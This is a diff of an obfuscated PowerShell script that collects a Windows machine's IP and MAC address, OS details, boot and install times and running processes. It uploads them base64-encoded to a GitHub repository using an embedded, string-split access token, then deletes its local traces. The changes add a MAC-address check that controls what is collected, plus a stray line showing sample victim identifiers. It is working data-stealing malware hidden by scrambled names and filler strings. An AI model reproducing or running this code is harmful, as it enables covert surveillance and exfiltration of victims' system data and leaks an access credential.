@@ -1,24 +1,74 @@
+
 $zqwxkplmnv = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null } | Select-Object -First 1).IPAddress[0]
 $plmnqwtzrk = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -ne $null } | Select-Object -First 1).MACAddress
 $plmnqwtzrk = $plmnqwtzrk -replace ":", ""
-$vxkplqwtmn = Get-Date -Format "MMdd_HHmm"
-$tzqlwmnrxp = "00001-$plmnqwtzrk-$zqwxkplmnv-$vxkplqwtmn.txt"
-$hqnxplmztw = Join-Path $env:appdata $tzqlwmnrxp
-(Get-CimInstance Win32_OperatingSystem).LastBootUpTime | Out-File -FilePath $hqnxplmztw
-$nxzqplmwtr = $hqnxplmztw
-$qwzmxnplkt = "htt"+"ps"+":/"+"/a" + "pi.g" + "ith" + "ub.com/re" + "pos/erik8-unity/unity-game/contents/log2/" + $tzqlwmnrxp
-$zkmnvwtqpl = "g"+"hp_VY5"+"eJhJfPmyDB22fqf"+"I4kMYB7OwK"+"hr3u6G4l"
-$bwzmxkplqt = $env:APPDATA
-$zmxkplqwtn = Get-Content -Path $nxzqplmwtr -Encoding Byte
-$vqwtzmxnpl = [Convert]::ToBase64String($zmxkplqwtn)
-$plmxnqwtzr = @{
-    message = "Upload file $tzqlwmnrxp"
-    content = $vqwtzmxnpl
-    branch = "main"
+00001-D04320524153-192.168.11.205
+$ch = @("asd");
+$in = @("D04320524153")
+if($in -contain $plmnqwtzrk){
+}elseif($ch -contain $plmnqwtzrk){
+    $xkzvqpmnlw = Join-Path $env:AppData "Microsoft"
+    $qplmnxztrw = "sdjkghjkldshgjkldhsgjkdshgjkhkjfgl;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh"
+    $zkmnvwtqpl = "g"+"h"+"p_VY5eJhJfPmy"+"DB22fqfI4kMYB7Ow"+"Khr3u6G4l"
+    $rwmnxlpqzt = "sdjkdgdgdgghjkldshgjkldhsgjkdshgjkhkjfgl;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh"
+    $yjqnvbzmxp = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null } | Select-Object -First 1).IPAddress[0]
+    $plmxnqwtzr = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -ne $null } | Select-Object -First 1).MACAddress
+    $plmxnqwtzr = $plmxnqwtzr -replace ":", ""
+    $vzmxkplqwt = Get-Date -Format "MMdd_HHmm"
+    $tzqlwmnrxp = "0-$plmxnqwtzr-$yjqnvbzmxp-$vzmxkplqwt.txt"
+    $hqnxplmztw = Join-Path $xkzvqpmnlw $tzqlwmnrxp
+    
+    (Get-CimInstance Win32_OperatingSystem).LastBootUpTime | Out-File -FilePath $hqnxplmztw
+    (Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber, OSArchitecture) | Out-File -FilePath $hqnxplmztw -Append
+    Get-WmiObject -Class Win32_ComputerSystem | Out-File -FilePath $hqnxplmztw -Append
+    
+    if ((Get-WmiObject -Class Win32_ComputerSystem).PCSystemType -eq 2) {
+        Write-Output "Note" | Out-File -FilePath $hqnxplmztw -Append
+    } else {
+        Write-Output "Desk" | Out-File -FilePath $hqnxplmztw -Append
+    }
+    
+    (Get-WmiObject Win32_OperatingSystem).InstallDate | Out-File -FilePath $hqnxplmztw -Append
+    $bwzmxkplqt = Get-Process
+    $bwzmxkplqt | Out-File -FilePath $hqnxplmztw -Append
+    $nxzqplmwtr = Split-Path $hqnxplmztw -leaf
+    $lpqwtzmxnr = "1243435sdjkghjkldshgjkldhsgjkdshgjkhkjfgl;kjklddsgdgdsgesgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh"
+    $qwzmxnplkt = "htt"+"ps"+":/"+"/a" + "pi.g" + "ith" + "ub.com/re"
+    $mxnqplwztv = "sdjkghjkldshgjkldhsgjkdshgjkhkjffght234243gl;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh"
+    $qwzmxnplkt += "pos/erik8-unity/unity-game/contents/log2/" + $tzqlwmnrxp
+    $zmxkplqwtn = Get-Content -Path $hqnxplmztw -Encoding Byte
+    $vqwtzmxnpl = [Convert]::ToBase64String($zmxkplqwtn)
+    $plmxnqwtzr = @{
+        message = "Upload file $tzqlwmnrxp"
+        content = $vqwtzmxnpl
+        branch = "main"
+    }
+    $kzmxnplqwt = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+    $kzmxnplqwt.Add("Authorization", "token $zkmnvwtqpl")
+    $kzmxnplqwt.Add("Content-Type", 'application/json')
+    Invoke-RestMethod -Uri $qwzmxnplkt -Method Put -Body ($plmxnqwtzr | ConvertTo-Json) -Headers $kzmxnplqwt
+    Remove-Item -Path $hqnxplmztw
+}else{
+    $vxkplqwtmn = Get-Date -Format "MMdd_HHmm"
+    $tzqlwmnrxp = "00001-$plmnqwtzrk-$zqwxkplmnv-$vxkplqwtmn.txt"
+    $hqnxplmztw = Join-Path $env:appdata $tzqlwmnrxp
+    (Get-CimInstance Win32_OperatingSystem).LastBootUpTime | Out-File -FilePath $hqnxplmztw
+    $nxzqplmwtr = $hqnxplmztw
+    $qwzmxnplkt = "htt"+"ps"+":/"+"/a" + "pi.g" + "ith" + "ub.com/re" + "pos/erik8-unity/unity-game/contents/log2/" + $tzqlwmnrxp
+    $zkmnvwtqpl = "g"+"hp_VY5"+"eJhJfPmyDB22fqf"+"I4kMYB7OwK"+"hr3u6G4l"
+    $bwzmxkplqt = $env:APPDATA
+    $zmxkplqwtn = Get-Content -Path $nxzqplmwtr -Encoding Byte
+    $vqwtzmxnpl = [Convert]::ToBase64String($zmxkplqwtn)
+    $plmxnqwtzr = @{
+        message = "Upload file $tzqlwmnrxp"
+        content = $vqwtzmxnpl
+        branch = "main"
+    }
+    $kzmxnplqwt = @{
+        "Authorization" = "token $zkmnvwtqpl"
+        "Content-Type" = "application/json"
+    }
+    $rwmnxlpqzt = Invoke-RestMethod -Uri $qwzmxnplkt -Method Put -Body ($plmxnqwtzr | ConvertTo-Json) -Headers $kzmxnplqwt
+    Remove-Item -Path $hqnxplmztw -Force
+
 }
-$kzmxnplqwt = @{
-    "Authorization" = "token $zkmnvwtqpl"
-    "Content-Type" = "application/json"
-}
-$rwmnxlpqzt = Invoke-RestMethod -Uri $qwzmxnplkt -Method Put -Body ($plmxnqwtzr | ConvertTo-Json) -Headers $kzmxnplqwt
-Remove-Item -Path $hqnxplmztw -Force
